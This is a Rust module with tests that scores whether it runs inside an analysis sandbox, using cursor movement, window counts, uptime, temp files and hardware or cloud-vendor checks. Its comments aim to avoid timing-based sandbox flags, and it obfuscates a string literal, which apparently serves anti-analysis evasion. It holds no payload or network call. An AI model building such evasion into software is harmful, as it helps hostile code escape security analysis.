use anyhow::Result;
use log::{info, warn};
#[cfg(windows)]
use string_crypt::enc_str;


#[derive(Debug, Default)]
pub struct SandboxMetrics {
    pub mouse_movement_score: u8,
    pub desktop_richness_score: u8,
    pub uptime_score: u8,
    pub hardware_plausibility_score: u8,
}

#[cfg(windows)]
pub fn check_mouse_movement() -> u8 {
    use winapi::um::winuser::GetCursorPos;
    use winapi::shared::windef::POINT;

    // Take 4 samples over ~1 second total.  Previously this was 20 × 500 ms = 10 s,
    // which stalled startup long enough to be trivially detected by timing analysis.
    // 4 × 250 ms = 1 s is still sufficient to detect a static/automated cursor
    // while keeping the window short enough to avoid timing-based sandbox flags.
    let mut positions = Vec::with_capacity(4);
    let mut total_distance = 0.0f64;

    for _ in 0..4 {
        let mut pt = POINT { x: 0, y: 0 };
        unsafe {
            if GetCursorPos(&mut pt) != 0 {
                positions.push((pt.x, pt.y));
            }
        }
        std::thread::sleep(std::time::Duration::from_millis(250));
    }

    let unique_positions: std::collections::HashSet<_> = positions.iter().copied().collect();

    for i in 1..positions.len() {
        let dx = (positions[i].0 - positions[i - 1].0) as f64;
        let dy = (positions[i].1 - positions[i - 1].1) as f64;
        total_distance += (dx * dx + dy * dy).sqrt();
    }

    if unique_positions.len() < 2 || total_distance < 5.0 {
        20
    } else if unique_positions.len() < 4 && total_distance < 50.0 {
        10
    } else {
        0
    }
}

/// Linux implementation: sample mouse position via `xdotool getmouselocation`.
/// Requires X11 / DISPLAY.  If the display is not available (headless server)
/// we return 0 so that legitimate non-interactive deployments are not penalised.
///
/// Uses a Rust-native thread-based 2-second timeout rather than the GNU
/// `timeout` command so that minimal containers (BusyBox, Alpine) and non-GNU
/// userlands are handled correctly without an external dependency.
///
/// If xdotool is not on PATH, or DISPLAY is not set, the function returns 0
/// (neutral score) so that legitimate headless or Wayland-only deployments
/// are not falsely penalised.
#[cfg(target_os = "linux")]
pub fn check_mouse_movement() -> u8 {
    if std::env::var_os("DISPLAY").is_none() {
        return 0; // Headless / Wayland-only — can't reliably track mouse
    }
    // Check xdotool availability without shelling out to `which`.
    let xdotool_on_path = std::env::var("PATH").is_ok_and(|p| {
        p.split(':')
            .any(|dir| std::path::Path::new(dir).join("xdotool").is_file())
    });
    if !xdotool_on_path {
        return 0; // xdotool absent — neutral, don't penalise the deployment
    }
    _sample_mouse_positions(|_| {
        // Spawn xdotool in a thread and join with a 2-second deadline.
        // This replaces the previous `timeout 2 xdotool …` invocation, which
        // required GNU coreutils and was incompatible with BusyBox/musl systems.
        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let out = std::process::Command::new("xdotool")
                .args(["getmouselocation", "--shell"])
                .output();
            let _ = tx.send(out);
        });
        let output = rx
            .recv_timeout(std::time::Duration::from_secs(2))
            .ok()? // timeout or channel closed
            .ok()?; // Command::output error
        if output.stdout.is_empty() {
            return None;
        }
        let out = String::from_utf8_lossy(&output.stdout);
        let x = out
            .lines()
            .find(|l| l.starts_with("X="))?
            .trim_start_matches("X=")
            .trim()
            .parse::<i32>()
            .ok()?;
        let y = out
            .lines()
            .find(|l| l.starts_with("Y="))?
            .trim_start_matches("Y=")
            .trim()
            .parse::<i32>()
            .ok()?;
        Some((x, y))
    })
}

/// macOS implementation: sample mouse position via a small Python3/Quartz one-liner.
/// On headless macOS (CI runners without a WindowServer) this command will fail
/// and we return 0 (neutral).
#[cfg(target_os = "macos")]
pub fn check_mouse_movement() -> u8 {
    _sample_mouse_positions(|_| {
        std::process::Command::new("python3")
            .args(["-c",
                "import Quartz; e=Quartz.CGEventCreate(None); \
                 p=Quartz.CGEventGetLocation(e); print(int(p.x), int(p.y))"
            ])
            .output()
            .ok()
            .and_then(|o| {
                let out = String::from_utf8_lossy(&o.stdout);
                let mut parts = out.split_whitespace();
                let x = parts.next()?.parse::<i32>().ok()?;
                let y = parts.next()?.parse::<i32>().ok()?;
                Some((x, y))
            })
    })
}

/// Shared sampling loop: calls `probe` 4 times with 250 ms intervals and
/// scores based on number of distinct positions seen and total travel distance.
#[cfg(any(target_os = "linux", target_os = "macos"))]
fn _sample_mouse_positions<F>(mut probe: F) -> u8
where
    F: FnMut(usize) -> Option<(i32, i32)>,
{
    let mut positions = Vec::with_capacity(4);
    let mut total_distance = 0.0f64;
    for i in 0..4 {
        if let Some(pos) = probe(i) {
            positions.push(pos);
        }
        std::thread::sleep(std::time::Duration::from_millis(250));
    }
    if positions.is_empty() {
        return 0; // Can't determine — neutral
    }
    let unique: std::collections::HashSet<_> = positions.iter().copied().collect();
    for w in positions.windows(2) {
        let dx = (w[1].0 - w[0].0) as f64;
        let dy = (w[1].1 - w[0].1) as f64;
        total_distance += (dx * dx + dy * dy).sqrt();
    }
    if unique.len() < 2 || total_distance < 5.0 {
        20
    } else if unique.len() < 4 && total_distance < 50.0 {
        10
    } else {
        0
    }
}

/// Catch-all for non-Linux, non-macOS, non-Windows platforms.
#[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
pub fn check_mouse_movement() -> u8 {
    0
}

#[cfg(windows)]
pub fn check_desktop_windows() -> u8 {
    use winapi::um::winuser::{EnumWindows, GetWindowTextLengthW, IsWindowVisible};
    use winapi::shared::minwindef::{BOOL, LPARAM, TRUE, FALSE};
    use winapi::shared::windef::HWND;

    // On Windows Server Core (headless) there is no desktop shell, so the
    // visible window count will be 0-2 regardless of whether we are in a VM.
    // Penalising a Server Core deployment is a false positive.  Detect it
    // via the InstallationType registry value and return neutral (0) instead.
    #[cfg(windows)]
    {
        use winapi::um::winreg::{RegOpenKeyExW, RegQueryValueExW, RegCloseKey, HKEY_LOCAL_MACHINE};
        use winapi::um::winnt::{KEY_READ, REG_SZ};
        let subkey: Vec<u16> = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\0".encode_utf16().collect();
        let value: Vec<u16> = "InstallationType\0".encode_utf16().collect();
        unsafe {
            let mut hkey = std::ptr::null_mut();
            if RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.as_ptr(), 0, KEY_READ, &mut hkey) == 0 {
                let mut buf = vec![0u16; 64];
                let mut buf_len = (buf.len() * 2) as u32;
                let mut val_type: u32 = 0;
                if RegQueryValueExW(hkey, value.as_ptr(), std::ptr::null_mut(), &mut val_type, buf.as_mut_ptr() as _, &mut buf_len) == 0 && val_type == REG_SZ {
                    RegCloseKey(hkey);
                    let nul = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
                    let install_type = String::from_utf16_lossy(&buf[..nul]);
                    if install_type == "Server Core" {
                        return 0; // neutral — headless by design, not a sandbox
                    }
                } else {
                    RegCloseKey(hkey);
                }
            }
        }
    }
    
    unsafe extern "system" fn enum_windows_proc(hwnd: HWND, lparam: LPARAM) -> BOOL {
        let count = &mut *(lparam as *mut usize);
        if IsWindowVisible(hwnd) != 0 {
            let length = GetWindowTextLengthW(hwnd);
            if length > 0 {
                *count += 1;
            }
        }
        TRUE
    }
    
    let mut count: usize = 0;
    unsafe {
        EnumWindows(Some(enum_windows_proc), &mut count as *mut _ as LPARAM);
    }
    
    if count < 3 {
        20
    } else if count < 8 {
        10
    } else {
        0
    }
}

/// Linux: count visible windows via `wmctrl -l` (falls back to xdotool or
/// process counting if wmctrl is unavailable).  Headless / no-DISPLAY → 0.
#[cfg(target_os = "linux")]
pub fn check_desktop_windows() -> u8 {
    if std::env::var_os("DISPLAY").is_none() {
        return 0;
    }
    // Try wmctrl first — it lists all managed windows.
    let count = std::process::Command::new("wmctrl")
        .arg("-l")
        .output()
        .ok()
        .map(|o| String::from_utf8_lossy(&o.stdout).lines().count())
        .or_else(|| {
            // Fallback: xdotool search returns one line per matching window
            std::process::Command::new("xdotool")
                .args(["search", "--onlyvisible", "--name", ""])
                .output()
                .ok()
                .map(|o| String::from_utf8_lossy(&o.stdout).lines().count())
        })
        .or_else(|| {
            // Last resort: count processes that hold an open connection to X11
            // by looking for "DISPLAY=" in their /proc/*/environ.
            // Cap at 256 entries to bound execution time on systems with many
            // processes; we only need to distinguish "0 or a few" vs "many".
            let mut cnt = 0usize;
            const MAX_ENTRIES: usize = 256;
            if let Ok(entries) = std::fs::read_dir("/proc") {
                for entry in entries.flatten().take(MAX_ENTRIES) {
                    // Only numeric entries are processes.
                    if entry.file_name().to_string_lossy().parse::<u32>().is_err() {
                        continue;
                    }
                    let env_path = entry.path().join("environ");
                    // environ files on Linux are small (<16 KiB) but reading
                    // them for every process is still O(n).  Early-exit once
                    // we have a result that will push count above threshold (8).
                    if let Ok(env) = std::fs::read(&env_path) {
                        if env.windows(8).any(|w| w == b"DISPLAY=") {
                            cnt += 1;
                            if cnt >= 8 {
                                break; // Already past the highest threshold
                            }
                        }
                    }
                }
            }
            Some(cnt)
        })
        .unwrap_or(0);

    if count < 3 {
        20
    } else if count < 8 {
        10
    } else {
        0
    }
}

/// macOS: count visible applications via AppleScript.
#[cfg(target_os = "macos")]
pub fn check_desktop_windows() -> u8 {
    let count = std::process::Command::new("osascript")
        .args(["-e",
            "tell application \"System Events\" to count (every process whose visible is true)"
        ])
        .output()
        .ok()
        .and_then(|o| {
            String::from_utf8_lossy(&o.stdout)
                .trim()
                .parse::<usize>()
                .ok()
        })
        .unwrap_or(0);

    if count < 3 {
        20
    } else if count < 8 {
        10
    } else {
        0
    }
}

/// Catch-all for unsupported platforms.
#[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
pub fn check_desktop_windows() -> u8 {
    0
}

#[cfg(windows)]
pub fn check_system_uptime_artifacts() -> u8 {
    use winapi::um::sysinfoapi::GetTickCount64;
    
    let uptime_ms = unsafe { GetTickCount64() };
    let uptime_mins = uptime_ms / 60000;
    let uptime_hours = uptime_mins / 60;
    
    let mut temp_files_count = 0;
    if let Ok(temp_dir) = std::env::temp_dir().read_dir() {
        temp_files_count = temp_dir.count();
    }
    
    if uptime_mins < 10 && temp_files_count < 5 {
        20
    } else if uptime_hours < 24 && temp_files_count < 20 {
        10
    } else {
        0
    }
}

/// Linux implementation: reads `/proc/uptime` for system uptime and counts
/// entries in `/tmp` as a proxy for usage history.
#[cfg(target_os = "linux")]
pub fn check_system_uptime_artifacts() -> u8 {
    let mut temp_files_count = 0;
    if let Ok(temp_dir) = std::fs::read_dir("/tmp") {
        temp_files_count = temp_dir.count();
    }
    
    let uptime_str = std::fs::read_to_string("/proc/uptime").unwrap_or_default();
    let uptime_secs: f64 = uptime_str.split_whitespace().next().unwrap_or("0").parse().unwrap_or(0.0);
    let uptime_mins = uptime_secs / 60.0;
    let uptime_hours = uptime_mins / 60.0;
    
    if uptime_mins < 10.0 && temp_files_count < 5 {
        20
    } else if uptime_hours < 24.0 && temp_files_count < 20 {
        10
    } else {
        0
    }
}

/// macOS implementation: derives uptime from `sysctl kern.boottime` and uses
/// the count of files in `$TMPDIR` as a usage proxy.
#[cfg(target_os = "macos")]
pub fn check_system_uptime_artifacts() -> u8 {
    // kern.boottime gives a timeval of when the system last booted.  We
    // compare it to the current time to compute uptime in seconds.
    let uptime_secs: f64 = {
        use std::time::{SystemTime, UNIX_EPOCH};
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs_f64())
            .unwrap_or(0.0);
        std::process::Command::new("sysctl")
            .args(["-n", "kern.boottime"])
            .output()
            .ok()
            .and_then(|o| {
                // Output looks like: "{ sec = 1713000000, usec = 0 } ..."
                let s = String::from_utf8_lossy(&o.stdout);
                s.split("sec = ")
                    .nth(1)
                    .and_then(|rest| rest.split(',').next())
                    .and_then(|v| v.trim().parse::<f64>().ok())
            })
            .map(|boot_sec| (now - boot_sec).max(0.0))
            .unwrap_or(0.0)
    };
    let uptime_mins = uptime_secs / 60.0;
    let uptime_hours = uptime_mins / 60.0;

    let temp_files_count = std::env::var("TMPDIR")
        .ok()
        .and_then(|p| std::fs::read_dir(p).ok())
        .map(|d| d.count())
        .unwrap_or(0);

    if uptime_mins < 10.0 && temp_files_count < 5 {
        20
    } else if uptime_hours < 24.0 && temp_files_count < 20 {
        10
    } else {
        0
    }
}

/// Catch-all for platforms other than Windows, Linux, and macOS.
#[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
pub fn check_system_uptime_artifacts() -> u8 {
    0 // Cannot determine; neutral score.
}

#[cfg(any(windows, target_os = "linux", target_os = "macos"))]
fn is_cloud_instance_sandbox() -> bool {
    #[cfg(target_os = "linux")]
    {
        let sys_vendor = std::fs::read_to_string("/sys/class/dmi/id/sys_vendor")
            .ok()
            .map(|v| v.trim().to_lowercase())
            .unwrap_or_default();
        let vendor_is_known_cloud = sys_vendor.contains("amazon")
            || sys_vendor.contains("microsoft")
            || sys_vendor.contains("google")
            || sys_vendor.contains("digitalocean")
            || sys_vendor.contains("vmware")
            || sys_vendor.contains("xen");

        if vendor_is_known_cloud {
            return true;
        }

        if let Ok(p) = std::fs::read_to_string("/sys/class/dmi/id/product_name") {
            let p = p.trim().to_lowercase();
            if p.contains("virtual") {
                if !vendor_is_known_cloud {
                    log::debug!(
                        "sandbox: product_name contains 'virtual' but sys_vendor '{}' is not a known cloud provider; treating as non-cloud",
                        sys_vendor
                    );
                    return false;
                }
                return true;
            }
            if p.contains("kvm") || p.contains("cloud") || p.contains("compute") || p.contains("vmware") {
                return true;
            }
        }
    }

    #[cfg(windows)]
    {
        use winapi::um::winnt::{KEY_READ, REG_SZ};
        use winapi::um::winreg::{
            RegCloseKey, RegOpenKeyExW, RegQueryValueExW, HKEY_LOCAL_MACHINE,
        };

        let subkey: Vec<u16> =
            "HARDWARE\\DESCRIPTION\\System\\BIOS\0".encode_utf16().collect();
        let manufacturer_value_name: Vec<u16> = "SystemManufacturer\0".encode_utf16().collect();
        let product_value_name: Vec<u16> = "SystemProductName\0".encode_utf16().collect();

        unsafe fn query_reg_sz(hkey: winapi::shared::minwindef::HKEY, name: &[u16]) -> Option<String> {
            let mut buf = vec![0u16; 256];
            let mut buf_len = (buf.len() * 2) as u32;
            let mut val_type: u32 = 0;
            if RegQueryValueExW(
                hkey,
                name.as_ptr(),
                std::ptr::null_mut(),
                &mut val_type,
                buf.as_mut_ptr() as _,
                &mut buf_len,
            ) != 0
                || val_type != REG_SZ
            {
                return None;
            }
            let nul = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
            Some(String::from_utf16_lossy(&buf[..nul]))
        }

        unsafe {
            let mut hkey = std::ptr::null_mut();
            if RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                subkey.as_ptr(),
                0,
                KEY_READ,
                &mut hkey,
            ) == 0
            {
                let vendor = query_reg_sz(hkey, &manufacturer_value_name)
                    .unwrap_or_default()
                    .trim()
                    .to_string();
                let product = query_reg_sz(hkey, &product_value_name)
                    .unwrap_or_default()
                    .trim()
                    .to_string();
                RegCloseKey(hkey);

                let vendor_lc = vendor.to_lowercase();
                let product_lc = product.to_lowercase();

                let microsoft_cloud = vendor_lc == "microsoft corporation"
                    && !product_lc.contains("surface");
                let vendor_is_known_cloud = vendor_lc.contains("amazon")
                    || microsoft_cloud
                    || vendor_lc.contains("google")
                    || vendor_lc.contains("digitalocean")
                    || vendor_lc.contains("vmware")
                    || vendor_lc.contains("xen");

                if product_lc.contains("virtual machine") {
                    if vendor_is_known_cloud {
                        return true;
                    }
                    return false;
                }

                if vendor_is_known_cloud {
                    return true;
                }
            }
        }
    }

    #[cfg(target_os = "macos")]
    {
        let output = std::process::Command::new("sysctl")
            .args(["-n", "kern.hv_vmm_present"])
            .output()
            .ok();
        if let Some(o) = output {
            if String::from_utf8_lossy(&o.stdout).trim() == "1" {
                return true;
            }
        }
    }

    false
}

#[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
fn is_cloud_instance_sandbox() -> bool {
    false
}

#[cfg(windows)]
pub fn check_hardware_plausibility() -> u8 {
    use winapi::um::fileapi::GetDiskFreeSpaceExW;
    use winapi::um::sysinfoapi::{GlobalMemoryStatusEx, GetSystemInfo, SYSTEM_INFO, MEMORYSTATUSEX};
    use winapi::shared::minwindef::TRUE;
    
    let mut total_bytes: u64 = 0;
    let mut free_bytes_available: u64 = 0;
    let mut total_free_bytes: u64 = 0;
    
    let c_drive: Vec<u16> = std::str::from_utf8(&enc_str!("C:\\")).unwrap().encode_utf16().chain(std::iter::once(0)).collect();
    
    unsafe {
        GetDiskFreeSpaceExW(
            c_drive.as_ptr(),
            &mut free_bytes_available as *mut _ as *mut winapi::shared::ntdef::ULARGE_INTEGER,
            &mut total_bytes as *mut _ as *mut winapi::shared::ntdef::ULARGE_INTEGER,
            &mut total_free_bytes as *mut _ as *mut winapi::shared::ntdef::ULARGE_INTEGER,
        );
    }
    
    let mut mem_status: MEMORYSTATUSEX = unsafe { std::mem::zeroed() };
    mem_status.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
    unsafe {
        GlobalMemoryStatusEx(&mut mem_status);
    }
    
    let mut sys_info: SYSTEM_INFO = unsafe { std::mem::zeroed() };
    unsafe {
        GetSystemInfo(&mut sys_info);
    }
    
    let disk_gb = total_bytes / (1024 * 1024 * 1024);
    let ram_gb = mem_status.ullTotalPhys / (1024 * 1024 * 1024);
    let cpus = sys_info.dwNumberOfProcessors;
    
    let cloud_instance = is_cloud_instance_sandbox();
    let mut below_threshold_count: u8 = 0;
    // Thresholds are scored differently for cloud hosts to reduce false
    // positives on small but legitimate instances. For cloud VMs, each
    // threshold contributes 5 points (instead of halving the final score),
    // and RAM is only scored when `ram_gb == 0` (sub-1 GiB after integer
    // GiB conversion, i.e., extremely small allocations).
    if disk_gb <= 10 { below_threshold_count += 1; }
    if cloud_instance {
        if ram_gb == 0 { below_threshold_count += 1; }
    } else if ram_gb <= 1 {
        below_threshold_count += 1;
    }
    if cpus <= 1 { below_threshold_count += 1; }

    if cloud_instance {
        below_threshold_count * 5
    } else {
        match below_threshold_count {
            0 => 0,
            1 => 10,
            _ => 20,
        }
    }
}

/// Linux implementation: reads disk size from `statvfs("/")`, RAM from
/// `/proc/meminfo`, and CPU count from `sysconf(_SC_NPROCESSORS_ONLN)`.
#[cfg(target_os = "linux")]
pub fn check_hardware_plausibility() -> u8 {
    let cloud_instance = is_cloud_instance_sandbox();
    let mut below_threshold_count: u8 = 0;
    
    let mut disk_gb = 0;
    unsafe {
        let mut stat: libc::statvfs = std::mem::zeroed();
        if libc::statvfs(c"/".as_ptr(), &mut stat) == 0 {
            disk_gb = (stat.f_blocks as u64 * stat.f_frsize as u64) / (1024 * 1024 * 1024);
        }
    }
    if disk_gb <= 10 { below_threshold_count += 1; }
    
    let mut ram_gb = 0;
    if let Ok(meminfo) = std::fs::read_to_string("/proc/meminfo") {
        if let Some(mem_total_line) = meminfo.lines().find(|l| l.starts_with("MemTotal:")) {
            if let Some(kb_str) = mem_total_line.split_whitespace().nth(1) {
                if let Ok(kb) = kb_str.parse::<u64>() {
                    ram_gb = kb / (1024 * 1024);
                }
            }
        }
    }
    if cloud_instance {
        if ram_gb == 0 { below_threshold_count += 1; }
    } else if ram_gb <= 1 {
        below_threshold_count += 1;
    }
    
    let cpus = unsafe { libc::sysconf(libc::_SC_NPROCESSORS_ONLN) };
    if cpus <= 1 { below_threshold_count += 1; }
    
    // Thresholds are scored differently for cloud hosts to reduce false
    // positives on small but legitimate instances. For cloud VMs, each
    // tripped threshold contributes 5 points and RAM is only scored when
    // `ram_gb == 0` (sub-1 GiB after integer GiB conversion).
    if cloud_instance {
        below_threshold_count * 5
    } else {
        match below_threshold_count {
            0 => 0,
            1 => 10,
            _ => 20,
        }
    }
}

/// macOS implementation: reads disk size from `statvfs("/")`, RAM from
/// `sysctl hw.memsize`, and CPU count from `sysconf(_SC_NPROCESSORS_ONLN)`.
#[cfg(target_os = "macos")]
pub fn check_hardware_plausibility() -> u8 {
    let cloud_instance = is_cloud_instance_sandbox();
    let mut below_threshold_count: u8 = 0;

    // Disk size via statvfs (works on macOS, same as Linux).
    let disk_gb: u64 = unsafe {
        let mut stat: libc::statvfs = std::mem::zeroed();
        if libc::statvfs(c"/".as_ptr(), &mut stat) == 0 {
            (stat.f_blocks as u64 * stat.f_frsize as u64) / (1024 * 1024 * 1024)
        } else {
            0
        }
    };
    if disk_gb <= 10 { below_threshold_count += 1; }

    // RAM via `sysctl hw.memsize` (returns total bytes as a 64-bit integer).
    let ram_gb: u64 = std::process::Command::new("sysctl")
        .args(["-n", "hw.memsize"])
        .output()
        .ok()
        .and_then(|o| String::from_utf8_lossy(&o.stdout).trim().parse::<u64>().ok())
        .map(|bytes| bytes / (1024 * 1024 * 1024))
        .unwrap_or(0);
    if cloud_instance {
        if ram_gb == 0 { below_threshold_count += 1; }
    } else if ram_gb <= 1 {
        below_threshold_count += 1;
    }

    let cpus = unsafe { libc::sysconf(libc::_SC_NPROCESSORS_ONLN) };
    if cpus <= 1 { below_threshold_count += 1; }

    // Thresholds are scored differently for cloud hosts to reduce false
    // positives on small but legitimate instances. For cloud VMs, each
    // tripped threshold contributes 5 points and RAM is only scored when
    // `ram_gb == 0` (sub-1 GiB after integer GiB conversion).
    if cloud_instance {
        below_threshold_count * 5
    } else {
        match below_threshold_count {
            0 => 0,
            1 => 10,
            _ => 20,
        }
    }
}

/// Catch-all for platforms other than Windows, Linux, and macOS.
#[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
pub fn check_hardware_plausibility() -> u8 {
    0 // Cannot determine; neutral score.
}

/// FR-5: Combined Heuristic Scoring and Decision Framework
///
/// Each signal is weighted but **capped** to prevent a single signal from
/// saturating the total score.  The caps ensure that reaching the "high
/// probability" threshold (> 60) requires at least **three** elevated signals,
/// and the "moderate" threshold (> 30) requires at least **two** signals.
///
/// Signal caps and max contributions:
/// * Mouse movement  (weight ×5, cap 30) — max total contribution: 30
/// * Desktop richness (weight ×3, cap 25) — max total contribution: 25
/// * Uptime artifacts (weight ×2, cap 25) — max total contribution: 25
/// * Hardware plausibility (weight ×1, cap 20) — max total contribution: 20
///
/// Total maximum: 100.
pub fn sandbox_probability_score(metrics: &SandboxMetrics) -> u32 {
    // Cap each signal contribution individually.
    let mouse_contrib   = std::cmp::min((metrics.mouse_movement_score as u32) * 5, 30);
    let desktop_contrib = std::cmp::min((metrics.desktop_richness_score as u32) * 3, 25);
    let uptime_contrib  = std::cmp::min((metrics.uptime_score as u32) * 2, 25);
    let hw_contrib      = std::cmp::min(metrics.hardware_plausibility_score as u32, 20);

    let score = mouse_contrib + desktop_contrib + uptime_contrib + hw_contrib;
    std::cmp::min(score, 100)
}

/// Run all sandbox heuristics and return a combined probability score (0–100).
///
/// Higher scores indicate a greater likelihood of a sandbox environment.
/// The caller decides what to do with the score — see `EnvReport::sandbox_score`.
pub fn evaluate_sandbox() -> Result<u32> {
    let metrics = SandboxMetrics {
        mouse_movement_score: check_mouse_movement(),
        desktop_richness_score: check_desktop_windows(),
        uptime_score: check_system_uptime_artifacts(),
        hardware_plausibility_score: check_hardware_plausibility(),
    };
    
    let score = sandbox_probability_score(&metrics);
    info!("Combined Sandbox Probability Score: {}", score);
    
    if score > 60 {
        warn!("High probability of sandbox (Score {} > 60)", score);
    } else if score > 30 {
        warn!("Moderate Sandbox Probability (Score {}).", score);
    }
    Ok(score)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn metrics(mouse: u8, desktop: u8, uptime: u8, hw: u8) -> SandboxMetrics {
        SandboxMetrics {
            mouse_movement_score: mouse,
            desktop_richness_score: desktop,
            uptime_score: uptime,
            hardware_plausibility_score: hw,
        }
    }

    /// A headless server (no mouse, no display) should NOT trigger a false
    /// positive even though mouse_movement_score is maxed out.
    #[test]
    fn headless_server_single_signal_below_high_threshold() {
        // mouse=20 → capped at 30; all other signals 0
        let score = sandbox_probability_score(&metrics(20, 0, 0, 0));
        assert!(
            score <= 30,
            "single elevated signal should not exceed moderate threshold: got {score}"
        );
    }

    /// Two elevated signals should reach "moderate" but not "high".
    #[test]
    fn two_signals_moderate_not_high() {
        // mouse=20 (cap 30) + desktop=20 (cap 25) = 55
        let score = sandbox_probability_score(&metrics(20, 20, 0, 0));
        assert!(score > 30, "two signals should exceed moderate threshold: got {score}");
        assert!(score <= 60, "two signals should not exceed high threshold: got {score}");
    }

    /// All four signals at maximum should reach 100.
    #[test]
    fn all_signals_max_reaches_high() {
        let score = sandbox_probability_score(&metrics(20, 20, 20, 20));
        assert!(score > 60, "all max signals must exceed high threshold: got {score}");
        assert!(score <= 100, "score must not exceed 100: got {score}");
    }

    /// Zero scores produce zero total.
    #[test]
    fn all_zero_scores_produces_zero() {
        assert_eq!(sandbox_probability_score(&metrics(0, 0, 0, 0)), 0);
    }
}
